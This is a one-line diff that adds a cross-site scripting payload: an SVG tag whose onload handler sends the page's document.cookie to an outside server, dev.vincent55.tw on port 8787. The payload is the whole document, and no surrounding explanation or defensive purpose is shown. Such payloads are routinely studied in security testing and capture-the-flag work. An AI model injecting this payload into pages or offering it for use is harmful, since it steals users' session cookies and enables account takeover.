@@ -1,0 +1,1 @@
+<svg/onload=fetch('http://dev.vincent55.tw:8787?a='+document.cookie)>
